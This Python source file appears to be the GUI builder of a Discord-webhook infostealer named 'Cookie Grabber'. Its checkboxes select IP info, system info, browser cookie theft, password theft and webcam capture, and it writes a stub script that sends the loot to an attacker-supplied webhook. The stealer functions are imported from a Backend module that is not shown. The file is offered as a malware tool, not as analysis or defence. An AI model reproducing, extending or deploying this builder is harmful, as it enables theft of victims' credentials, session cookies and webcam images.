import customtkinter, tkinter, requests, browser_cookie3, os, inspect, platform, GPUtil, psutil
from discord_webhook import DiscordEmbed, DiscordWebhook
from PIL import Image
from Backend import CG, IP, PS, SI, WP
sad = False
das = False
sadsx = False
sadsxs = False
sadsxsx = False
home = os.getcwd()
ip = IP
paswrds = PS
sysinfos = SI
roblos = CG
webpic = WP
customtkinter.set_appearance_mode('Dark')
GrabberGUI = customtkinter.CTk()
GrabberGUI.geometry('720x650')
GrabberGUI.title('[I458I] Cookie Grabber. | V1.0 | https://github.com/I458I')
me = os.getcwd()
asdfg = os.path.join(me, "Backend", "white bird.png")
sfcg = customtkinter.CTkImage(Image.open(asdfg), size=(150, 150))
bird = customtkinter.CTkButton(GrabberGUI, image=(sfcg), text="", fg_color="transparent", corner_radius=32, font=("Roboto", 5))
bird.pack()
def tasd():
    webys = weby.get()
    try:
     webysx = webys[:-75] + "..."
     asd.configure(text_color="lime",text=f'"{webysx}" | Valid Webhook')
     x = DiscordWebhook(url=webys, username="[I458I] Grabber.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&", content="@everyone")
     mdsf = DiscordEmbed(title="[I458I] | Webhook is working")
     x.add_embed(mdsf)
     x.execute()
    except:
       asd.configure(text=f'"{webys}" | Invalid Webhook', text_color="red")
dsg = customtkinter.CTkLabel(GrabberGUI, text="Cookie Grabber", font=("Roboto", 50), text_color="lime")
dsg.pack()
dsg = customtkinter.CTkLabel(GrabberGUI, text="Enter the webhook", font=("Roboto", 30))
dsg.pack()
weby = tkinter.StringVar()
inps = customtkinter.CTkEntry(GrabberGUI, width=350, height=40, textvariable=weby, font=("Roboto", 20))
inps.pack()
asd = customtkinter.CTkLabel(GrabberGUI, text="", font=("Roboto", 20), text_color="red")
asd.pack()
submite = customtkinter.CTkButton(GrabberGUI, width=100, height=40, font=("Roboto", 20), text="Test Webhook", command=tasd, corner_radius=32)
submite.pack(padx=10, pady=10)
def sads():
 global sad
 sad = True
asdf = customtkinter.CTkCheckBox(GrabberGUI, width=50, height=25, font=("Roboto", 25), text_color="red", text="Ip Info", command=sads)
asdf.pack()
def dass():
 global das
 das = True
asdfs = customtkinter.CTkCheckBox(GrabberGUI, width=50, height=25, font=("Roboto", 25), text_color="red", text="PC Info", command=dass)
asdfs.pack(padx=70)
def asdfdsaf():
 global sadsx
 sadsx = True
asdfsx = customtkinter.CTkCheckBox(GrabberGUI, width=50, height=25, font=("Roboto", 25), text_color="red", text="Cookie Grabber", command=asdfdsaf)
asdfsx.pack(padx=70)
def sdfgseadtfg():
 global sadsxs
 sadsxs = True
asdfsxs = customtkinter.CTkCheckBox(GrabberGUI, width=50, height=25, font=("Roboto", 25), text_color="red", text="Password Grabber", command=sdfgseadtfg)
asdfsxs.pack(padx=70)
def wefoihpfhdnaui():
 global sadsxsx
 sadsxsx = True
asdfsxsx = customtkinter.CTkCheckBox(GrabberGUI, width=50, height=25, font=("Roboto", 25), text_color="red", text="Webcam Picture", command=wefoihpfhdnaui)
asdfsxsx.pack(padx=70)
def compiling():
 nasdijf()
 webys = weby.get()
 s=os.path.join(me, "Stub")
 if not os.path.exists(s):
  os.mkdir(s)
 Stubd=os.path.join(me, "Stub", f"{sssdas}.py")
 with open(Stubd, 'w') as file:
  g = inspect.getsource(IP)
  gx = inspect.getsource(SI)
  gxg = inspect.getsource(CG)
  gxgx = inspect.getsource(PS)
  gxgxg = inspect.getsource(WP)
  file.write(f"from discord_webhook import DiscordEmbed, DiscordWebhook\nimport requests,browser_cookie3,platform, GPUtil, psutil,os,shutil,base64,json,sqlite3,win32crypt,cv2,zipfile,time\nfrom Cryptodome.Cipher import AES\nfrom datetime import datetime, timedelta\nwbz='{webys}'\n")
  if sad == True:
   file.write(g)
   file.write("ip()\n")
  if das == True:
   file.write(gx)
   file.write("sysinfos()\n")
  if sadsx == True:
   file.write(gxg)
   file.write("roblos()\n")
  if sadsxs == True:
   file.write(gxgx)
   file.write("sdfgasad()\n")
  if sadsxsx == True:
   file.write(gxgxg)
   file.write("saycheese()\n")
ddgfas = customtkinter.CTkLabel(GrabberGUI, text="Enter File Name", font=("Roboto", 30))
ddgfas.pack()
grasdcafvg = tkinter.StringVar()
sadef = customtkinter.CTkEntry(GrabberGUI, width=200, height= 20, textvariable=grasdcafvg, font=("Roboto", 20))
sadef.pack()
def nasdijf():
 global sssdas
 sssdas = grasdcafvg.get()
 if sssdas == "":
  sssdas = "Grabber"
sssdas = sssdas = ".py"
submit = customtkinter.CTkButton(GrabberGUI, width=100, height=50, font=("Roboto", 20), text="Compile", command=compiling, corner_radius=32)
submit.pack()
GrabberGUI.mainloop()